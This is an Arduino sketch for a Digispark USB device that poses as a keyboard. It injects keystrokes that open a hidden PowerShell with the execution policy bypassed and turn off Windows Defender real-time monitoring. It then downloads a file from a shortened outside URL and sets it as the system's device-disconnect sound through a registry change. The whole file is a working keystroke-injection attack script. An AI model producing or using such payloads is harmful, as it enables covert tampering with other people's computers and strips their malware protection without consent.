#include "DigiKeyboard.h"
void setup() { //execute once
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
  //DigiKeyboard.print("powershell -NoP -W -Exec Bypass");
  DigiKeyboard.delay(2000);
  // Disable Windows Defender
  DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
  DigiKeyboard.delay(100);
  // Allow scripts from interwebs to run (.ps1)
  //DigiKeyboard.println(F("set-executionpolicy unrestricted"));
  //DigiKeyboard.delay(100);
  // Accept
  //DigiKeyboard.println(F("Y"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(9000);
  DigiKeyboard.print("Invoke-WebRequest 'http://bit.do/horse85' -OutFile $env:temp/s.wav;reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\DeviceDisconnect\\.Current\\ /t REG_SZ /d  $env:temp/s.wav /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {

  }
